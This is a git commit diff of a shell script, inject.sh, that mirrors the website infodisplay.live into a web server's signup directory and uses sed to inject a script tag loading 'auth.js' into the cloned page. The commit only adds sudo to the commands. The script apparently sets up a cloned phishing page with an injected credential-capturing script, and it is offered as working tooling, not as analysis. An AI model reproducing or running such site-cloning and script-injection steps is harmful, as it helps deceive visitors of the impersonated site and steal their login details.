6ae375fc87bda71d08a843b12445c4c5c05a77af
sephoxx <sephoxx@gmail.com>
2021-09-18 18:03:17 +0300

    final 4

--- inject.sh
+++ inject.sh
@@ -4,13 +4,13 @@ wget -k -p -c -E -F http://infodisplay.live -P /var/www/html/signup/
 
 if [[ $? == 0 ]]
 then
-rm -rf /var/www/html/signup/page
+sudo rm -rf /var/www/html/signup/page
 
-mkdir /var/www/html/signup/page
+sudo mkdir /var/www/html/signup/page
 
 sudo mv /var/www/html/signup/infodisplay.live/* /var/www/html/signup/page/
 
-rm -rf /var/www/html/signup/infodisplay.live
+sudo rm -rf /var/www/html/signup/infodisplay.live
 
-sed -i 's/<\/body>/<script src="..\/auth.js"><\/script><\/body>/g' /var/www/html/signup/page/index.html
+sudo sed -i 's/<\/body>/<script src="..\/auth.js"><\/script><\/body>/g' /var/www/html/signup/page/index.html
 fi
